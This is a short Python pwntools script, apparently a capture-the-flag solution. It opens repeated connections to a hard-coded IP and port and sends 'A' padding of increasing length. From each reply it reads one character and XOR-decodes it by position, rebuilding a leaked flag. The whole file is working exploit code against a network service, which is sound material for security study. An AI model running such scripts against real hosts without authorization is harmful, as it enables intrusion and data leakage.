from pwn import *

host = '141.85.224.106'
port = 31336

start_buffer_size = 12
max_buffer_size = 12 + 40

final_flag = b''

def xor_decode(data, pos):
    return bytes([data[0] ^ pos])

for buffer_size in range(start_buffer_size, max_buffer_size + 1):
    r = remote(host, port)

    payload = b'A' * buffer_size

    r.sendline(payload)
    r.recvline()                    # skip the Hello, <user_input>! message
    response = r.recvline().strip() # the character that was XORed with its position

    flag = xor_decode(response, buffer_size - 12)
    final_flag += flag

    r.close()

    sleep(0.1)                      # sleep to avoid connection issues or spamming the server

print(f"Final flag: {final_flag}")
